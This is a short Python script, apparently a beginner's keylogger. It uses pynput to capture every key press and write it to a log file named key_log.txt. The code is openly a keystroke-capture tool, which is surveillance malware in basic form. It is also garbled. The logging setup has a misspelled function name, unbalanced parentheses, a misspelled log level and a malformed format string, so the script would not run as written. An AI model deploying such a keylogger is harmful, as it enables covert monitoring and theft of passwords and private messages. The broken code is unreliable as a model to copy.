from pynput.keyboard import Key, Listener

import logging

log_dir = ""
logging.basicconfig(log_dir + " key_log.txt"), level=logging.DEGUB, format ="& (asctimes: &(message)s")
def on_press(Key):
    logging.info(Key)

with Listener(on_press=on_press) as listener:
    listener.join()
